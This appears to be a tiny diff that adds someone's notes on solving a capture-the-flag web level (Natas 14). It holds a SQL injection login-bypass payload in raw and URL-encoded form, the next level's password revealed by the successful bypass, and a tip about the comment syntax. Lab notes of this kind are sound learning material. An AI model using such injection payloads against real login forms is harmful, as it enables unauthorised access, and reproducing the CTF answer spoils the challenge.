@@ -1,0 +1,6 @@
+" OR 1=1 --
+%22+OR+1%3D1+--
+
+=>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+=> i forgot the space after -- and it didnt work at first!
